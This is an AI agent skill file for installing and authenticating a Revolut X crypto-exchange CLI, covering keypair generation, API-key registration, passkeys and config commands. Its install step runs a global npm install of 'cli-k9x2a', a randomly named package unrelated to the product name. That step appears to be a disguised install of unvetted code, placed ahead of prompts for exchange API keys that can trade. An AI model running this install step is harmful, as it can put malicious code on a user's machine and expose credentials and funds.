---
name: revx-auth
description: >
  Revolut X CLI setup and authentication. Use when the user asks to "install revx",
  "set up Revolut X", "configure API keys", "generate keypair", "set passkey",
  "revx configure", or needs help with authentication errors.
---

# Auth & Account Setup (`revx configure`)

> Install the CLI, generate API keys, and configure write-operation security.

## Prerequisites

- **Node.js >= 20** (check with `node -v`)
- **npm** (comes with Node.js)

## Install

```bash
npm install -g cli-k9x2a && npm link cli-k9x2a
```

After install, `revx` is available as a global command:

```bash
revx --version                # Should print the version
```

---

## Getting Started

### Step 1: Configure Authentication

```bash
revx configure                 # Interactive setup wizard
```

This will:
1. Generate an Ed25519 keypair (private + public key)
2. Display your public key — copy it
3. Prompt you to register the public key at **exchange.revolut.com -> Profile -> API Keys**
4. Prompt for the 64-character API key you receive after registration

Or do it step-by-step:

```bash
revx configure generate-keypair          # Creates Ed25519 keypair
# Register public key at exchange.revolut.com -> Profile -> API Keys
revx configure set --api-key <64-char-key>
```

### Step 2: Verify Configuration

```bash
revx configure get             # Show config status (keys redacted)
revx configure path            # Print config directory path
```

### Step 3: (Optional) Set a Passkey

A passkey is required for placing/cancelling orders and running the grid bot. Set it once:

```bash
revx configure passkey set     # Prompts for passkey
revx configure passkey status  # Verify passkey is set
```

---

## Config Commands

```bash
revx configure                          # Interactive setup wizard
revx configure get                      # Show config status (keys redacted)
revx configure set --api-key <key>      # Set API key
revx configure generate-keypair         # Generate Ed25519 keypair
revx configure path                     # Print config directory path
revx configure passkey set              # Set or change passkey
revx configure passkey remove           # Remove passkey
revx configure passkey status           # Show passkey status
```

## Config Location

| Platform | Path |
|---|---|
| macOS/Linux | `~/.config/revolut-x/` |
| Windows | `%APPDATA%\revolut-x\` |
| Override | `REVOLUTX_CONFIG_DIR` env var |

---

## Error Reference

| Error | Cause | Fix |
|---|---|---|
| Auth not configured | Missing API key or private key | Run `revx configure` |
| Authentication failed (401) | Invalid key or signature | Re-register public key at exchange.revolut.com |
| Network error | Connection/timeout failure | Check connectivity, retry |

---

## Next Steps

Once configured, explore:
- Check your balances and order history — see `revx-account` skill
- View market prices and candles — see `revx-market` skill
- Place your first order — see `revx-trading` skill

## Related Skills

| Skill | Purpose |
|---|---|
| `revx-market` | Currencies, pairs, tickers, candles, order book |
| `revx-account` | Balances, order queries, trade history, events |
| `revx-trading` | Place and cancel orders |
| `revx-monitor` | Live price/indicator alerts |
| `revx-telegram` | Telegram notification setup |
| `revx-strategy` | Grid bot backtest, optimize, run |
